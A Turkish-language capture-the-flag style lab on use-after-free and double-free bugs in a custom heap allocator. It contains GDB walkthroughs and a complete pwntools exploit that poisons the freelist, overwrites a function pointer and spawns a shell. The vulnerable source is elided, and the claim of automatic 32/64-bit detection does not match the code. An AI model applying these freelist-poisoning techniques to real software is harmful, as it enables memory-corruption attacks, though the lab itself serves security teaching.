# CyberLabs: Double Free & Use-After-Free Laboratuvarı

**Modül Kodu:** CL-MEM-006

**Seviye:** İleri

**Konu:** Bellek Bozulması Zafiyetleri (Heap Exploitation)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, özel olarak implemente edilmiş bir heap yöneticisi üzerindeki kritik zafiyetleri ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  * Özel bir heap yöneticisindeki tasarım hatalarının nasıl zafiyetlere yol açtığını anlamak.
  * Bir pointer'ın serbest bırakıldıktan sonra sıfırlanmamasının **Use-After-Free** ve **Double Free** zafiyetlerine nasıl neden olduğunu görmek.
  * `gdb` ve `pwntools` gibi ileri seviye araçlar kullanarak zafiyet analizi ve sömürü kodu geliştirmek.
  * Zafiyeti kullanarak programın belleğinde istenen bir adrese yazma (Arbitrary Write) yeteneği elde etmek ve programın kontrol akışını `win()` fonksiyonuna yönlendirerek shell elde etmek.

## Senaryo

Laboratuvar senaryosu, kendi basit `my_alloc` ve `my_free` fonksiyonlarına sahip, düşük seviyeli bir bellek yönetimi uygulamasını simüle eder. Kullanıcılar komut satırından bellek blokları ayırabilir (`alloc`), serbest bırakabilir (`free`), içlerine veri yazabilir (`write`) ve programdaki bir fonksiyonu çağırabilir (`call`).

1.  `vulnerable_code.cpp`: Kullanıcının serbest bıraktığı bir bellek bölgesini daha sonra tekrar kullanmasına (Use-After-Free) ve çift serbest bırakmasına (Double Free) izin veren, kasıtlı olarak zafiyetli bırakılmış hedef C++ uygulaması.
2.  `exploit.py`: Zafiyeti tetikleyerek uygulamanın serbest listesini (freelist) manipüle eden, programdaki `gTarget.fn` fonksiyon işaretçisinin üzerine yazarak kontrol akışını ele geçiren ve shell çalıştıran `win()` fonksiyonunu çağıran Python sömürü kodu.

## Disclaimer / Yasal Uyarı

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Zafiyetin Kökeni Nedir?

Bu programdaki zafiyetler, `free` komutunun işlenmesinden sonra `slots[idx]` pointer'ının `nullptr` olarak ayarlanmamasından kaynaklanır. Bu durum, programın serbest bırakılmış bir bellek bölgesine ait adresi hala geçerliymiş gibi tutmasına neden olur. Bu "sallanan pointer" (dangling pointer) iki ana saldırıya olanak tanır:

  * **Double Free:** Kullanıcı, `free <idx>` komutunu aynı indeks için birden çok kez çalıştırarak aynı bellek bloğunu serbest listesine birden çok kez ekleyebilir.
  * **Use-After-Free (UAF):** Kullanıcı, `free <idx>` komutuyla bir bloğu serbest bıraktıktan sonra, `write <idx> <veri>` komutuyla bu artık serbest olan ve listenin bir parçası olan bloğun içine veri yazabilir. Bu, serbest listesinin yapısını bozmak için son derece güçlü bir yöntemdir. Exploit'imiz bu yöntemi kullanacaktır.

### Örnek Kod İncelemesi (`vulnerable_code.cpp`)

```cpp
// vulnerable_code.cpp
#include <iostream>
// ... (kodun geri kalanı öncekiyle aynı) ...
// ... (main fonksiyonu ve diğer yardımcı fonksiyonlar) ...
```

**Kodu Derleme:**

**Linux için:**
```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow -static-libgcc -static-libstdc++
```

**macOS için:**
```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

`-no-pie` bayrağı, `gTarget` gibi global değişkenlerin adreslerini sabit tutarak sömürü yazımını kolaylaştırır. `-g` ise GDB için debug sembolleri ekler. Linux'ta static linking kullanarak farklı sistemlerde çalışabilir hale getiriyoruz.

### Exploit Geliştirme Aşaması (Use-After-Free ile Freelist Zehirleme)

**Hedef:** `Use-After-Free` zafiyetini kullanarak `my_alloc`'un bize `gTarget.fn`'in adresini içeren bir chunk döndürmesini sağlamak. Sonrasında bu chunk'a `win`'in adresini yazarak `call` komutuyla program akışını ele geçirmek.

#### 1\. Gerekli Adresleri Bulma

Program artık adresleri otomatik olarak yazdırmıyor. Bu adresleri GDB ile manuel olarak bulmanız gerekiyor:

**GDB ile Adres Bulma:**

```bash
gdb ./vulnerable_code
(gdb) break main
(gdb) run
(gdb) p &gTarget.fn
$1 = (void (**)()) 0x404040
(gdb) p win
$2 = {void (void)} 0x4011a0 <win()>
(gdb) quit
```

Bu adresleri not edin - exploit betiğinizde kullanacaksınız.

#### 2\. Zafiyetin GDB ile Tespiti (Adım Adım)

Bu bölümde, **Double Free** zafiyetinin serbest listesini (freelist) nasıl bozduğunu GDB ile adım adım göreceğiz.

1.  **GDB'yi Başlatma:** Programı debug sembolleri ile derlediğinizden emin olun ve GDB'yi başlatın.

    ```bash
    gdb ./vulnerable_code
    ```

2.  **Breakpoint Koyma:** Zafiyetin kalbi olan `my_free` fonksiyonuna bir durma noktası koyalım.

    ```gdb
    (gdb) break my_free
    (gdb) run
    ```

3.  **Belleği Hazırlama:** Program sizden komut bekleyecektir. Önce bir chunk ayıralım.

    ```
    > alloc
    [+] alloc idx=0 ptr=0x405000
    ```

4.  **İlk `free` Çağrısını İnceleme (Normal Durum):** Chunk 0'ı serbest bırakalım. GDB `my_free` fonksiyonunda duracaktır.

    ```
    > free 0
    ```

    GDB içinde, `g_head`'in ve serbest bırakılan chunk'ın (`c`) durumuna bakalım. `continue` demeden önce, freelist'in doğru bir şekilde güncellendiğini (`g_head`'in artık `c`'yi gösterdiğini ve `c`'nin ilk 8 byte'ının eski `g_head`'i gösterdiğini) `p g_head` ve `x/gx c` komutlarıyla doğrulayabilirsiniz. Sonra `continue` ile devam edin.

5.  **İkinci `free` Çağrısı (Zafiyet Anı):** Şimdi zafiyeti tetikleyelim ve aynı chunk'ı tekrar serbest bırakalım.

    ```
    > free 0
    ```

    GDB tekrar duracaktır. Şimdi en kritik an:

    ```gdb
    # g_head'in ve c'nin aynı adresi gösterdiğine dikkat edin.
    (gdb) p g_head
    $1 = (Chunk *) 0x405000
    (gdb) p c
    $2 = (Chunk *) 0x405000

    # my_free fonksiyonunda bir satır ilerleyelim (n komutu).
    (gdb) n

    # Şimdi chunk'ın içeriğini tekrar kontrol edelim.
    (gdb) x/gx c
    0x405000:       0x0000000000405000
    ```

    **İşte Zafiyet\!** Gördüğünüz gibi, `0x405000` adresindeki chunk'ın ilk 8 byte'ı artık yine kendisini (`0x405000`) gösteriyor. Serbest listesinde bir döngü yarattık. Chunk artık kendisine işaret ediyor. Bu durum, bir sonraki `alloc` çağrılarının hep aynı adresi döndürmesine neden olur ve bu da UAF saldırısının temelini oluşturur.

#### 3\. Sömürü Mantığı

1.  **Hazırlık:** İki chunk ayır (`A` ve `B`).
2.  **Dangling Pointer Yarat:** `A`'yı serbest bırak. `slots` dizisindeki pointer'ı hala `A`'nın adresini tutmaktadır (UAF durumu).
3.  **Freelist'i Zehirle:** `write` komutunu `A`'nın indeksiyle kullanarak, serbest bırakılmış `A` chunk'ının ilk 8 byte'ının üzerine (freelist'teki sonraki elemanı gösteren pointer'ın üzerine) hedefimiz olan `&gTarget.fn` adresini yazıyoruz.
4.  **Heap'i Aldatma:** Şimdi 2 kez `alloc` çağırıyoruz. İlki bize `A`'yı, ikincisi ise bizim zehirlediğimiz "sonraki eleman" pointer'ını takip ederek bize **`&gTarget.fn`** adresini bir chunk gibi döndürür.
5.  **Kontrolü Ele Geçirme:** Artık elimizde `gTarget.fn`'i gösteren bir chunk indeksi var. Bu indekse `write` komutu ile `win` fonksiyonunun adresini yazıyoruz.
6.  **Shell'i Alma:** `call` komutunu çalıştırarak manipüle ettiğimiz `gTarget.fn()`'i çağırıyor ve shell'i alıyoruz.

### Sömürü Kodunun Tam Hali (`exploit.py`)

Bu etkileşimli program için `pwntools` ile yazılmış exploit betiği aşağıdadır.

```python
from pwn import *
import re

# Pwntools ile süreci başlat
p = process("./vulnerable_code")

# Manuel olarak bulunan adresleri buraya yazın
# GDB ile bulduğunuz adresleri aşağıdaki değişkenlere atayın
target_fn_addr = 0x404040  # GDB'den aldığınız &gTarget.fn adresi
win_addr = 0x4011a0        # GDB'den aldığınız win fonksiyonu adresi

log.info(f"Hedef &gTarget.fn adresi: {hex(target_fn_addr)}")
log.info(f"Hedef &win adresi: {hex(win_addr)}")

def alloc():
    p.sendline(b"alloc")
    return p.recvuntil(b"> ").decode()

def free(idx):
    p.sendline(f"free {idx}".encode())
    return p.recvuntil(b"> ").decode()

def write(idx, data_hex):
    p.sendline(f"write {idx} {data_hex}".encode())
    return p.recvuntil(b"> ").decode()

def call():
    p.sendline(b"call")

log.info("Adim 1: Iki chunk ayiriliyor (A ve B)")
print(alloc()) # chunk 0 (A)
print(alloc()) # chunk 1 (B)

log.info("Adim 2: Dangling pointer olusturmak icin chunk 0 (A) serbest birakiliyor")
print(free(0))

log.info(f"Adim 3: Freelist zehirleniyor. A'nin FD'sinin uzerine &gTarget.fn ({hex(target_fn_addr)}) yaziliyor")
poison_payload = p64(target_fn_addr).hex()
print(write(0, poison_payload))

log.info("Adim 4: Hedef adresi chunk olarak almak icin iki chunk daha ayiriliyor")
print(alloc()) # Bu A'yi geri verir, yeni index 0
alloc_response = alloc()
print(alloc_response)
target_idx = int(re.search(r"alloc idx=(\d+)", alloc_response).group(1))
log.success(f"&gTarget.fn adresi {target_idx} numarali index olarak ele gecirildi!")


log.info(f"Adim 5: Kontrolu ele gecir! Hedef pointer'in uzerine &win ({hex(win_addr)}) adresi yaziliyor")
win_payload = p64(win_addr).hex()
print(write(target_idx, win_payload))

log.info("Son adim: Manipule edilmis fonksiyon pointer'ini cagiriliyor!")
call()

# Shell'i interaktif olarak kullan
p.interactive()
```

Bu betiği çalıştırdığınızda, adım adım özel heap yöneticisini manipüle edecek ve en sonunda `win()` fonksiyonunu başarıyla çağırarak size bir `bash` shell'i verecektir.

## Linux Uyumluluğu

Bu lab hem Linux hem de macOS sistemlerde çalışacak şekilde tasarlanmıştır:

### Linux'ta Derleme
```bash
# Linux için özel derleme scripti
./compile_linux.sh

# Veya manuel derleme
g++ -std=c++11 -o compiled/vulnerable_code source_code/vulnerable_code.cpp \
    -no-pie -g -Wno-unused-result -Wno-stringop-overflow \
    -static-libgcc -static-libstdc++
```

### Gereksinimler
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Test Etme
```bash
# Tüm testleri çalıştır
./test_lab.sh

# Exploit'i çalıştır
python3 source_code/exploit.py
```

Exploit otomatik olarak sistem mimarisini (32-bit/64-bit) algılar ve uygun packing fonksiyonunu kullanır.